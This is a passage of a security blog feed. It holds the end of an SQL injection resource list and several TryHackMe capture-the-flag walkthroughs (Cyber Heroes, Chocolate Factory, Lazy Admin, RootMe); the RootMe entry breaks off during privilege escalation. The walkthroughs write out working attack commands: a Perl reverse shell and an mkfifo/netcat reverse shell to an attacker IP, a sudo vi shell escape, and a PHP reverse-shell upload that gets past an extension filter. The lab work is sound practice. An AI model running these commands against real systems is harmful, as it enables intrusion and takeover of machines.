  <li><a href="https://python.plainenglish.io/pentesting-introduction-to-sql-injection-attack-part-1-5166e4617b71">Edward Low - Edward Low</a></li>
  <li><a href="https://systemweakness.com/sql-injection-important-things-you-need-to-know-right-now-b173cdea0610">Sudarshan S - SQL INJECTION: IMPORTANT…</a></li>
  <li><a href="https://systemweakness.com/sql-injection-6348398d6651">Arth Detroja - SQL Injection</a></li>
  <li><a href="https://a51f221b.medium.com/web-penetration-testing-guide-3a5162731fe6">A51F221B - Web penetration testing guide</a></li>
  <li><a href="https://www.w3schools.com/sql/default.asp">W3Schools - SQL Tutorial</a></li>
  <li><a href="https://www.codecademy.com/learn/learn-sql">Codecademy - Learn SQL</a></li>
  <li><a href="https://www.programiz.com/sql">Programiz - Learn SQL: SQL Tutorial for Beginners</a></li>
  <li><a href="https://www.tutorialspoint.com/sql/index.htm">TutorialsPoint - SQL Tutorial</a></li>
  <li><a href="https://roadmap.sh/cyber-security">Cyber Security Roadmap</a></li>
</ul>

<p><br /></p>

<h3 id="chs">SQL Injection Cheat Sheets</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy - SQL Injection Cheat Sheet</a></li>
  <li><a href="https://infosecwriteups.com/sql-injection-payload-list-b97656cfd66b">Ismail Tasdelen - SQL Injection Payload List</a></li>
  <li><a href="https://sqlwiki.netspi.com/">NetSPI SQL Injection Wiki</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">Pentestmonkey - Oracle SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">Pentestmonkey - MySQL SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">Pentestmonkey - Postgres SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet">Pentestmonkey - Informix SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentestmonkey - MSSQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet">Pentestmonkey - DB2 SQL Injection Cheat Sheet</a></li>
  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet">Pentestmonkey - Ingres SQL Injection Cheat Sheet</a></li>
  <li><a href="https://www.codecademy.com/learn/defending-express-applications-from-sql-injection-xss-csrf-attacks/modules/preventing-sql-injection-attacks/cheatsheet">Codecademy - Preventing SQL Injection Attacks</a></li>
  <li><a href="https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/">Exploiting hard filtered SQL Injections</a></li>
  <li><a href="http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html">MS Access SQL Injection Cheat Sheet</a></li>
  <li><a href="https://www.yazilimkodlama.com/sql-server-2/sql-sorgulari-ve-ornekleri/">Yazılım Kodlama - SQL Sorguları ve SQL Sorgu Örnekleri</a></li>
  <li><a href="https://cheatography.com/neolex/cheat-sheets/injection-sql/">Cheatography - Injection SQL Cheat Sheet by Neolex</a></li>
  <li><a href="https://cheatography.com/nimakarimian/cheat-sheets/sql-cheatsheet/">Cheatography - SQL CheatSheet Cheat Sheet by nimakarimian</a></li>
  <li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">INVICTI - SQL Injection Cheat Sheet</a></li>
  <li><a href="https://deadlyhacker.wordpress.com/2013/05/09/list-of-google-dorks-for-sql-injection/">Deadly Hacker - List of google dorks for sql injection</a></li>
  <li><a href="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/">Perspective Risk - MySQL SQL Injection Practical Cheat Sheet</a></li>
  <li><a href="https://www.asafety.fr/mysql-injection-cheat-sheet/">MySQL Injection Cheat Sheet</a></li>
</ul>

<p><br />
<br />
I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>

<p><br /></p>

<h2 id="1-cyberheroes">1. CyberHeroes</h2>

<p><br /></p>

<h3 id="11-uncover-the-flag">1.1 Uncover the flag!</h3>

<p>Let’s do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.39.168
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/cyber-heroes/nmap.png" alt="nmap" /></p>

<p>Two ports are open. Theese are <code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code>.</p>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>I found three pages on the website. These are <code class="language-plaintext highlighter-rouge">Home, About, and Login</code>.</p>

<p>Let’s look at them all.</p>

<ul>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">Home</code></strong></em></p>

    <p><img src="/assets/img/tryhackme/cyber-heroes/home.png" alt="home" /></p>

    <p>I check the source page but I don’t see anything significant.</p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">About</code></strong></em></p>

    <p>I don’t see anything significant on the page.</p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">Login</code></strong></em></p>

    <p><img src="/assets/img/tryhackme/cyber-heroes/login.png" alt="login" /></p>

    <p>I check the source page and I found this script.</p>

    <p><img src="/assets/img/tryhackme/cyber-heroes/source.png" alt="source" /></p>

    <p>As I understand it <code class="language-plaintext highlighter-rouge">username: h3ck3rBoi</code> and <code class="language-plaintext highlighter-rouge">password: RevereString("*****@t*****r****")</code>.</p>

    <p>We need to write the password in reverse. So, <code class="language-plaintext highlighter-rouge">password: S****S*****@*****</code></p>
  </li>
</ul>

<p>Now that we’ve found the username and password, let’s log in.</p>

<p>And the flag is here.</p>

<p><img src="/assets/img/tryhackme/cyber-heroes/flag.png" alt="flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, security, credential" /><summary type="html"><![CDATA[Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/cyber-heroes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/cyber-heroes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Chocolate Factory</title><link href="http://localhost:4000/tryhackme-chocolate-factory/" rel="alternate" type="text/html" title="TryHackMe Chocolate Factory" /><published>2023-03-29T00:00:00+03:00</published><updated>2023-03-29T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chocolate-factory</id><content type="html" xml:base="http://localhost:4000/tryhackme-chocolate-factory/"><![CDATA[<p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!</p>

<p><br /></p>

<h2 id="1-introduction">1. Introduction</h2>

<p>Welcome to Willy Wonka’s Chocolate Factory!</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket" /></p>

<p>This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa</p>

<p>This is a beginner friendly room!</p>

<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>

<p>( Created by AndyInfosec team for the community! )</p>

<p><br /></p>

<h2 id="2-challenges">2. Challenges</h2>

<p><br /></p>

<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>

<p>Let’s do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap" /></p>

<p>A lot of ports are open.</p>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home" /></p>

<p>I see a login page. Let’s do a gobuster scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster" /></p>

<p>We found a few php files. First, let’s look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php" /></p>

<p>We can run commands on this page. Let’s connect with burp suite. Capture the page and send it to the repeater.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls" /></p>

<p>Let’s look at the files in the directory in order, of what we will find.</p>

<ul>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>

    <p>I don’t see anything significant here.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak" /></p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>

    <p>This file is probably a script because the cat command doesn’t work.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key" /></p>

    <p>Let’s back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat" /></p>

    <p>Let’s try.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
 $ ./key_rev_key 
</code></pre></div>    </div>

    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try" /></p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
</code></pre></div>    </div>

    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings" /></p>

    <p>Let’s try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key" /></p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>

    <p>We found the username and password for the website.</p>

    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate" /></p>
  </li>
</ul>

<p><br /></p>

<h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>

<p><br /></p>

<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>

<p>Now, we can execute a reverse-shell command on home.php. First, let’s go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey’s cheat sheet</a>. You can try all of them.</p>

<p>Perl, python, and netcat are working.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>

<p>First, let’s setup a netcat listener.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>After copying and pasting.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse" /></p>

<p>We are inside.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first" /></p>

<p>Now, we can change the user to charlie.</p>

<p>We found a RSA key in charlie’s directory</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa" /></p>

<p>Let’s connect to charlie ssh.</p>

<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
$ ssh -i id_rsa charlie@10.10.153.7
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh" /></p>

<p>And we are inside.</p>

<p><br /></p>

<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>

<p>Now, let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>

<p>Now, we checking the sudo privileges.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l" /></p>

<p>We can get root privileges using vi. I’m going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins" /></p>

<p>Now, we can root privilege using this command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc" /></p>

<p>We are inside. Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>

<p><br /></p>

<h2 id="1-lazy-admin">1. Lazy Admin</h2>

<p>Have some fun! There might be multiple ways to get user access.</p>

<p><br /></p>

<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>

<p>Let’s do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>I see an apache default page on the website.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache" /></p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one" /></p>

<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let’s go to the directory.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content" /></p>

<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>

<p>So, I try another gobuster scan on this directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content" /></p>

<p>We found a few directories here. Let’s examine all directories.</p>

<ul>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>

    <p>We found a lot of files in this directory.</p>

    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc" /></p>

    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>

    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest" /></p>
  </li>
  <li>
    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>

    <p>We found a login page here.</p>

    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as" /></p>
  </li>
</ul>

<p><br /></p>

<p>I searched SweetRice in <a href="https://www.exploit-db.com/">exploit-db</a>.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search" /></p>

<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718">SweetRice 1.5.1 - Backup Disclosure</a></p>

<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first" /></p>

<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say" /></p>

<p>Let’s go and see.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back" /></p>

<p>Let’s go to the /mysql_backup/ directory.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file" /></p>

<p>Let’s see what’s inside this file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside" /></p>

<p>We found two important things here.</p>

<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>

<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>

<p>It seems the password is a hash. Let’s identify and crack this hash.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id" /></p>

<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>

<p>Let’s crack. <a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p>

<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash" /></p>

<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: *******</code></strong></em></p>

<p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home" /></p>

<p>Now we can upload a reverse shell. So, I download pentest monkey’s <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>

<p>Then we go to the Post &gt; Create</p>

<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create" /></p>

<p>After, we can add a file below the page. (.php file isn’t working you must change the extension.)</p>

<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below" /></p>

<p>After the upload, the page looks like this.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload" /></p>

<p>Now, we set up a netcat listener.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
</code></pre></div></div>

<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml">http://10.10.103.31/content/attachment/shell.phtml</a></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside" /></p>

<p>Now, let’s get to the user flag.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>

<p>Very surprisingly for www-data, we have sudo privileges.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l" /></p>

<p>The backup script is a Perl script that calls /etc/copy.sh</p>

<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy" /></p>

<p>Now we edit this copy.sh, file to get the root privilege.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
</code></pre></div></div>

<p>Let’s setup a netcat listener.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
</code></pre></div></div>

<p>Let’s run the backup.pl file and get the root privilege.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc" /></p>

<p>We are inside. Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security, linux" /><summary type="html"><![CDATA[Easy linux machine to practice your skills]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/lazy-admin.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/lazy-admin.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - RootMe</title><link href="http://localhost:4000/tryhackme-rootme/" rel="alternate" type="text/html" title="TryHackMe - RootMe" /><published>2023-03-27T00:00:00+03:00</published><updated>2023-03-27T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-rootme</id><content type="html" xml:base="http://localhost:4000/tryhackme-rootme/"><![CDATA[<p>A ctf for beginners, can you root me?</p>

<p><br /></p>

<h2 id="1-deploy-the-machine">1. Deploy the machine</h2>

<p>Connect to TryHackMe network and deploy the machine. If you don’t know how to do this, complete the OpenVPN room first.</p>

<p><br /></p>

<h2 id="2-reconnaissance">2 Reconnaissance</h2>

<p>First, let’s get information about the target.</p>

<p><br /></p>

<h3 id="21-scan-the-machine-how-many-ports-are-open">2.1 Scan the machine, how many ports are open?</h3>

<p>Let’s do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.226.173
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/rootme/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: 2</code></strong></p>

<p><br /></p>

<h3 id="22-what-version-of-apache-is-running">2.2 What version of Apache is running?</h3>

<p><img src="/assets/img/tryhackme/rootme/apache.png" alt="apache" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: 2.4.29</code></strong></p>

<p><br /></p>

<h3 id="23-what-service-is-running-on-port-22">2.3 What service is running on port 22?</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: SSH</code></strong></p>

<p><br /></p>

<h3 id="24-find-directories-on-the-web-server-using-the-gobuster-tool">2.4 Find directories on the web server using the GoBuster tool.</h3>

<p>I am visiting the website running on port 80. I see a page like this:</p>

<p><img src="/assets/img/tryhackme/rootme/home.png" alt="home" /></p>

<p>Let’s do a gobuster scan for this website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.226.173/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><br /></p>

<h3 id="25-what-is-the-hidden-directory">2.5 What is the hidden directory?</h3>

<p><img src="/assets/img/tryhackme/rootme/gobuster.png" alt="gobuster" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: /panel/</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="3-getting-a-shell">3 Getting a shell</h2>

<p>Find a form to upload and get a reverse shell, and find the flag.</p>

<p><br /></p>

<h3 id="31-usertxt">3.1 user.txt</h3>

<p>I check the /uploads/ directory but nothing in here.</p>

<p><img src="/assets/img/tryhackme/rootme/uploads.png" alt="uploads" /></p>

<p>I am going to the /panel/ directory.</p>

<p><img src="/assets/img/tryhackme/rootme/panel.png" alt="panel" /></p>

<p>We upload files here. Then let’s do this:</p>
<ul>
  <li>Let’s download pentestmonkey’s php-reverse-shell.php file. <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Here</a>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</code></pre></div>    </div>
  </li>
  <li>
    <p>Now, edit the php-reverse-shell.php file.</p>

    <p><img src="/assets/img/tryhackme/rootme/edit.png" alt="edit" /></p>
  </li>
  <li>
    <p>Let’s set up a netcat listener.</p>

    <p><img src="/assets/img/tryhackme/rootme/nc.png" alt="nc" /></p>
  </li>
</ul>

<p>Now we can upload the file to the website. Let’s go back to the /panel/ directory.</p>

<p>I try to upload the file but it’s not working. I get error like this.</p>

<p><img src="/assets/img/tryhackme/rootme/error.png" alt="error" /></p>

<p>Let’s try changing the extension of the PHP file. Like this:</p>

<p><img src="/assets/img/tryhackme/rootme/ex.png" alt="ex" /></p>

<p>If you want, you can try using burp suite, but there is not much possibility anyway, I prefer to change manually.</p>

<p>I will try these: <code class="language-plaintext highlighter-rouge">.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml</code></p>

<p>The <code class="language-plaintext highlighter-rouge">.phtml</code> worked.</p>

<p>Now, let’s go to the /uploads/ directory and run the reverse shell we uploaded.</p>

<p><img src="/assets/img/tryhackme/rootme/upshell.png" alt="upshell" /></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/rootme/in.png" alt="in" /></p>

<p>Now we can get the user flag.
I looked at the user directories in the home directory, but could not find the user.txt.</p>

<p>Now let’s find user.txt with this command.</p>

<p><img src="/assets/img/tryhackme/rootme/find.png" alt="find" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -name user.txt
</code></pre></div></div>

<p>Yes, we found the user.txt file.</p>

<p><img src="/assets/img/tryhackme/rootme/finduser.png" alt="finduser" /></p>

<p>Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/rootme/user-flag.png" alt="user-flag" /></p>

<p><em><strong>Attention: It allows some files to be uploaded, but when you try to run it in the /uploads/ directory, you get something like this.</strong></em></p>

<p><img src="/assets/img/tryhackme/rootme/uperror.png" alt="uperror" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="4-privilege-escalation">4 Privilege escalation</h2>

<p>Now that we have a shell, let’s escalate our privileges to root.</p>

<p><br /></p>

<h3 id="41-search-for-files-with-suid-permission-which-file-is-weird">4.1 Search for files with SUID permission, which file is weird?</h3>

<p><em><strong>Hint: find / -user root -perm /4000</strong></em></p>

<p>Based on the hint, I ran the following code on the target system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/rootme/suid.png" alt="suid" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: /usr/bin/python</code></strong></p>

<p><br /></p>

